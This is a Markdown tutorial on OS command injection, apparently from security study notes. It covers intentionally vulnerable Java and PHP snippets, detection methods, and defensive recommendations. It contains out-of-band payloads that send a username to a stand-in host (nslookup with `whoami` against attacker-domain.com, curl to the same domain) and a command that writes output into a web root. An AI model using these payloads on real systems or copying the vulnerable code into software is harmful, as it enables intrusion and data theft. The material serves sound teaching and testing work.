# Command Injection

This attack is also know as __operating system (OS) command injection__ or [__shell injection__](https://en.wikipedia.org/wiki/Code_injection#Shell_injection).

## DISCLAIMER⚠️

**__EXPLOITATION OF THIS ISSUE CAN HAVE SEVERE CONSEQUENCES FOR THE VULNERABLE SYSTEM. BE SURE YOU KNOW WHAT YOU ARE DOING❗__**

## Description

Command injection is a critical security vulnerability that allows an attacker to execute OS commands on a server or computer hosting an application.

This exploitation can result in the complete compromise of the application and its data. Typically, this vulnerability arises when an application accepts user input without adequate validation or sanitization, enabling malicious commands to be injected and executed within the system.


By exploiting command injection, an attacker can not only compromise the application itself but also potentially gain unauthorized access to other parts of the hosting infrastructure. This breach of security can be leveraged to exploit trust relationships and pivot the attack to other systems within the organization.

## Command execution in different programming languages

### Command execution using Java

```
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;

public void runUnsafe(HttpServletRequest request) throws IOException {
    String cmd = request.getParameter("command");
    String arg = request.getParameter("arg");
    Runtime.getRuntime().exec(cmd + " " + arg);
}
```

### Command execution using PHP
```
<?php
    print("Please specify the name of the file to delete");
    print("<p>");
    $file=$_GET['filename'];
    system("rm $file");
?>
```

## Types of command injection

Basically, there are two types of command injection:

1. In-band command injection (when output is visible to the attacker).
2. Out-of-band command injection (when output is not visible to the attacker).

## Methodology

In order to identify the command injection one can use the following methodology both for black-box and white-box testing:

1. Identify all instances where the web application appears to be interacting with the underlying operating system.
2. Fuzz the application supplying shell metacharacters: `&`, `&&`, `|`, `||`, `;`, `\n`, `` ` ``, `$()`.
3. For in-band command injection, analyze the response of the app to determine if it is vulnerable.
4. For blind command injection try to trigger a time delay using `ping` or `sleep` command or output the response of the command in the web root and retrieve file directly using a browser.
5. Open out-of-band channel back to a server you control.

### Detecting blind OS command injection using time delays

Certain commands can be used to trigger a time delay to confirm that the command was executed based on the time that the application takes to respond.

#### Ping

The `ping` command is a good and safe way to do it because it allows to specify the number of ICMP packets to send. Usually one packet is sent each second so if you send ten packets then it will take ten seconds to execute. When `ping` command sends an ICMP packet with `TTL=64` that signals Linux OS while `TTLS=128` signals Windows OS.

```
$ ping -c 10 127.0.0.1

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.058 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.063 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.053 ms
64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.052 ms
64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.047 ms
64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=9 ttl=64 time=0.056 ms
64 bytes from 127.0.0.1: icmp_seq=10 ttl=64 time=0.074 ms

--- 127.0.0.1 ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 9220ms
rtt min/avg/max/mdev = 0.047/0.057/0.074/0.006 ms
```

#### Sleep

The `sleep` command is another way to trigger a time delay and as the `ping` command allows to specify the number of seconds the shell will sleep for.

`sleep 10`

### Exploiting blind OS command injection by redirecting output

Sometimes one can redirect output of a command into a file which is accessible by him. For example, a web application can store static resources in the `/var/www/static` that are publicely available to the users and if the application is vulnerable then the following command will redirect output of the command and store it in the file that is accessible by anyone:

```whoami > /var/www/static/whoami.txt```

### Exploiting blind OS command injection using out-of-band techniques

Injected command can be used to trigger an out-of-band interaction with a controlled system. This technique is especially good in cases where the result of command execution is not displayed.

There are multiple ways to establish the out-of-band interaction but the most frequently used are DNS and HTTP protocols. No matter which protocol or command is used to establish the out-of-band interaction the attacker can monitor to see if the lookup happens, to confirm if the command was successfully injeted.

#### DNS

The `nslookup` command allows to cause a DNS request for the specified domain:

`nslookup attacker-domain.com`

This technique can also be combined with other commands or shell metacharacters:

``nslookup `whoami`.attacker-domain.com``

The result of the command will look like this:

`nslookup johndoe.attacker-domain.com`

`johndoe` is the name of the user on behalf of which the command was executed.

#### HTTP

The `curl` command allows to send an HTTP request to the specified domain:

`curl http://attacker-domain.com/`

This command can also be combined with other commands or shell metacharacters as was shown before.

## Shell features

One can inject code into this program in several ways by exploiting the syntax of various shell features:

| **Shell feature** | **OS** | **Example** | **Explanation** |
|:------------------|:-------:|:------------:|:-------------:|
| Sequential execution | Linux | `command1 ; command 2` | Executes `command1`, then executes `command2` |
| Pipeline | Linux, Windows | `command1 \| command2` | Sends the output of `command1` as input to `command2` |
| Command substitution | Linux | ``command1 `command2` `` or `command1 $(command2)` | Sends the output of `command2` as arguments to `command1` |
| AND list | Linux, Windows | `command1 && command2` | Executes `command2` if `command1` returns an exit status of 0 (sucess) |
| OR list | Linux, Windws | `command1 \|\| command2` | Executes `command2` if `command1` returns a non-zero exit status (error) |
| Output redirection | Linux, Windows | `command1 > test.txt` | Overwrites the content of `test.txt` file with the output of `command1` |
| Input redirection | Linux, Windows | `command1 < test.txt` | Sends the content of `test.txt` file as input to `command1` |

In certain contexts newline character (`0x0a` or `\n`) can also be used as a command separator but only on Unix-based systems.

Sometimes, the input that the attacker controls appears within quotation marks in the original command. In this situation, one need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command. 

## Useful commands

After the command injection vulnerability has been identified, it is usefull to execute some initial commands to get some information about the system.

| **Purpose of command**   | **Linux**     | **Windows**     |
|:-------------------------|:-------------:|:---------------:|
| Name of the current user | `whoami`      | `whoami`        |
| OS details               | `uname -a`    | `uname -a`      |
| Network config           | `ifconfig -a` | `ipconfig /all` |
| Network connections      | `netstat -an` | `netstat -an`   |
| Running processes        | `ps -ef`      | `tasklist`      |

## Recommendations

- Sanitize User Input

    1. Implement a strict allow list approach for validating user input. Create a list containing only allowable characters or commands, eliminating any characters not explicitly permitted.
    2. Utilize an allow list for both URL and form data, filtering out characters known to be associated with command injection vulnerabilities.
    3. Consider a general deny list to include characters commonly used in command injection attacks, such as |, ;, &, $, >, <, ', \, !, >>, #.

- Permissions and Execution Control

    1. Ensure that the web application and its components run under strict permissions that prohibit operating system command execution.
    2. Verify permissions and execution capabilities from a gray-box testing perspective, assessing potential vulnerabilities and areas of weakness.

- Use Existing APIs or Implement Strong Input Validation

    1. Prefer existing APIs provided by the programming language or framework over executing OS commands directly.
    2. Scrub all user input for malicious characters, implementing a positive security model by defining legal characters rather than illegal ones.
    3. If using user-supplied input in OS commands:
        - Validate against a whitelist of permitted values.
        - Validate that the input is a number if applicable.
        - Validate that the input contains only alphanumeric characters, excluding any other syntax or whitespace.
        - Avoid attempting to sanitize input by escaping shell metacharacters, as this method is prone to errors and can be bypassed by skilled attackers.

## Labs

- [PortSwigger - OS Command Injection Labs](https://portswigger.net/web-security/all-labs#os-command-injection)

## Videos
1. [Web Security Academy - Command Injection Playlist](https://www.youtube.com/playlist?list=PLuyTk2_mYISK9ywsFZZOT1LuO3Eb7Wq5q)
2. [What is command injection? - Web Security Academy](https://www.youtube.com/watch?v=8PDDjCW5XWw)

## References
1. [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)
2. [Testing for Command Injection - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
3. [OS Command Injection Defense Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
4. [Command Injection - Hacktricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
5. [Command Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
6. [OS Command Injection - Portswigger](https://portswigger.net/web-security/os-command-injection)